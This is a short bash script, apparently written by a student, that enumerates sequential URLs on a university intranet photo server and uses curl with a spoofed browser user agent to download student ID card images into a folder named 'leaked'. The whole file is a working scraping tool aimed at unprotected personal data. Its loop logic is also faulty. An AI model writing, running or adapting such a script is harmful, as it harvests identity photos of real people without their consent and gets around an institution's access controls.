 #!/bin/bash


# Crawl baby Crawl. Script to crawl ID card images from GPMS.
# Works in Amrita Intranet Only
# This script will until they block hotlinking ;)

USERNUM=01
USERPREFIX='http://gpms.amritanet.edu/gpis/photos/U4CSE14/U4CSE142'
USERSUFFIX='.png'
FOLDER="leaked"
mkdir $FOLDER
for (( USERNUM ; USERNUM <= 65; i++ ))
	do
	USERNUM=$(($USERNUM+1))
	USERCREATE="$USERPREFIX$USERNUM$USERSUFFIX"
   	echo "Current User :  $USERNUM$USERSUFFIX"
   	curl -o $FOLDER/$USERNUM$USERSUFFIX -A "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3" $USERCREATE

done

